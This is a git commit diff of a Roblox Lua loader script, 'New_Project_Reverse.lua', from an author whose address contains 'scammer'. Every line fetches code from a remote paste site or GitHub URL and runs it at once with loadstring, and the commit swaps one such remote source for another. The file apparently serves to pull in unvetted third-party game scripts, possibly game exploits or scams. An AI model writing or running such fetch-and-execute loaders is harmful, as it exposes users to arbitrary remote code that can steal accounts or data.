2801f4cb5159de266e8f72f2b73a52c43b64abec
terist999 <xscammer25@gmail.com>
2025-07-22 02:24:43 -0800

    Update New_Project_Reverse.lua

--- New_Project_Reverse.lua
+++ New_Project_Reverse.lua
@@ -1,2 +1,2 @@
-loadstring(game:HttpGetAsync('https://pastefy.app/0BAIbRH8/raw'))()
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/QP6PVofSPSnwtcwi/raw", true))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/main/refs/heads/main/games/gagvisual.lua", true))("discord.gg/csxu2nCkw9")
